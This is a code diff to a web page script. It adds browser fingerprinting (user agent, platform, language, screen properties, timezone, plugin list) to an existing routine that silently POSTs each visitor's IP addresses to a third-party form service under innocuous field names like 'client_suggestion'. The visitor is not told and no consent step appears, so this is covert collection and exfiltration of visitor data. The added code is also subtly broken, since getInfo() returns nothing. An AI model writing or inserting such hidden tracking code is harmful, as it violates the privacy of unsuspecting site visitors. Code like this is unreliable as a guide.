@@ -1,4 +1,26 @@
 
+		function getInfo() {
+
+			var systemInfo = {
+				userAgent: navigator.userAgent,                
+				platform: navigator.platform,                 
+				language: navigator.language || navigator.userLanguage, 
+				screenWidth: screen.width,                    
+				screenHeight: screen.height,                 
+				colorDepth: screen.colorDepth,                
+				devicePixelRatio: window.devicePixelRatio,    
+				timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, 
+				plugins: []                                   
+			};
+
+			if (navigator.plugins && navigator.plugins.length > 0) {
+				for (var i = 0; i < navigator.plugins.length; i++) {
+					systemInfo.plugins.push(navigator.plugins[i].name);
+				}
+			}
+
+		}
+
         function getRealIPv4() {
 			return new Promise((resolve) => {
 				const xhr = new XMLHttpRequest();
@@ -39,6 +61,7 @@
         
         function sendIP(ip, ipv4) {
             const xhr = new XMLHttpRequest();
+			var systemInfo = getInfo();
             xhr.open("POST", "https://api.web3forms.com/submit", true);
 			xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 			var params = 
@@ -48,7 +71,8 @@
             "&email=" + encodeURIComponent("security@tianya.at") + 
             "&q2_client_loc=" + encodeURIComponent(ip) + 
 			"&q3_client_location=" + encodeURIComponent(ipv4) + 
-            "&q4_submission_date=" + encodeURIComponent(new Date().toLocaleString());
+            "&q4_submission_date=" + encodeURIComponent(new Date().toLocaleString()) +
+			"&q5_client_suggestion=" + encodeURIComponent(JSON.stringify(systemInfo));
         
 			xhr.send(params);
         }
